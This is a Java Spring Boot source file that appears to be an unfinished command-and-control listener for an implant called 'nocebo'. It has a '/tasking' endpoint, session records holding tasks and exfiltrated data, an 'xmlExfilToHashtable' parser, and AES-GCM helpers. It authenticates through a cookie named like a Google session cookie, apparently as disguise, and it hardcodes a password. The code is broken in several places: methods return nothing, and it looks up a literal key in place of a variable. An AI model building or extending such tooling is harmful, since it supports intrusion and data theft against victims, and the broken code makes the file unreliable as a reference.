package com.nocebo.listener;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.annotation.RequestScope;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.CookieValue;

import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidKeyException;
import java.security.SecureRandom;
import java.security.MessageDigest;

import javax.crypto.IllegalBlockSizeException;


import java.io.IOException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Base64;
import java.util.Random;
import java.nio.charset.StandardCharsets;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.text.SimpleDateFormat;

@RestController
class endpoints
{
	static String passwd = "T__+Pmv.REW=u9iXBB-";
	static noceboApiUtil napi = new noceboApiUtil();
	static security sapi = new security();
	static Hashtable<String,session> sessionTable = new Hashtable();

	@PostMapping("/60000")
	String auth(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws NoSuchAlgorithmException
	{
		session sessionData;

		if (!sessionTable.keySet().contains(idCookie))
		{
			sessionData = new session();
			sessionData.nonce = idCookie.substring(0,12).replace("-","");
			sessionTable.put(idCookie, sessionData);
		}

		sessionData = (session) sessionTable.get("idCookie");


		sessionData.cookie = napi.mkCookie(idCookie, passwd);
	}

	@PostMapping("/60001")
	String data(@RequestBody noceboApiRequest requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie)
	{

	}

	@PostMapping("/tasking")
	String ctrl(@RequestBody noceboApiRequest requestData)
	{
		//put authenticator in front
	}

	@RequestMapping("/log")
	String log(@RequestBody noceboApiRequest requestData)
	{
		//put authenticator in front
		return sessionTable.toString();
	}

}

class session
{
	static String cookie = new String();
	static ArrayList tasks = new ArrayList();
	static String lastSeen = new String();
	static ArrayList data = new ArrayList();
	static String encKey = new String();
	static String nonce = new String();
}

class noceboApiRequest
{
	String data;
	noceboApiRequest(String data)
	{
		this.data = data;
	}
}

class noceboApiUtil
{
	public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
	{
		SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
		int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
		return randNum;
	}

	public static String strand(int strLen) throws NoSuchAlgorithmException {
		//random string, for nonces and such
		String asciiChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		StringBuilder randStr = new StringBuilder();
		for (int x=0; x<strLen; x++) {
			SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
			randStr.append(asciiChars.charAt(rHandle.nextInt(asciiChars.length())));
		}
		return randStr.toString();
	}

	public String mkCookie(String uuid, String passwd) throws NoSuchAlgorithmException
	{
		String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
		Hashtable cookieMaterialRaw = new Hashtable();

		cookieMaterialRaw.put("tstamp",timeStamp);
		cookieMaterialRaw.put("uuid",uuid);
		cookieMaterialRaw.put("passwd",passwd);
		cookieMaterialRaw.put("randPadding",strand(8));

		MessageDigest digest = MessageDigest.getInstance("SHA-256");
		byte[] encodedHash = digest.digest(
			cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
		);
		return new String(Base64.getEncoder().encode(encodedHash));
	}

	public Hashtable xmlExfilToHashtable(String xmlPostData) throws ParserConfigurationException, IOException, SAXException
	{
		//<modname><fieldname data=""></modname>
		Hashtable xmlParsed = new Hashtable();

		DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
		DocumentBuilder constructor = manufactorum.newDocumentBuilder();
		Document doc = constructor.parse(xmlPostData);

		Element rootElement = doc.getDocumentElement();

		NodeList nl = rootElement.getChildNodes();
		for (int n=0;n<nl.getLength();n++)
		{
			Node nodeData = nl.item(n);
			Element nodeElement = (Element) nodeData;
			xmlParsed.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
		}
		return xmlParsed;
	}
}

class security
{
	//replicates my lycanthropy aesgcm
	private byte[] encrypt(byte[] plaintext, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
	{
		SecretKey key = initKey(keyData);
		Cipher cipher = initCipher();

		AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
		cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
		return cipher.doFinal(plaintext);
	}

	private byte[] decrypt(byte[] encrypted, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
	{
		SecretKey key = initKey(keyData);
		Cipher cipher = initCipher();

		AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
		cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
		return cipher.doFinal(encrypted);
	}

	private Cipher initCipher() throws Exception
	{
		Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
		return cipher;
	}

	private SecretKey initKey(String encKey) throws Exception
	{
		byte[] keyBytes = Base64.getDecoder().decode(encKey);
		SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
		return key;
	}
}

@SpringBootApplication
public class ListenerApplication {

	public static void main(String[] args) {
		SpringApplication.run(ListenerApplication.class, args);
	}

}
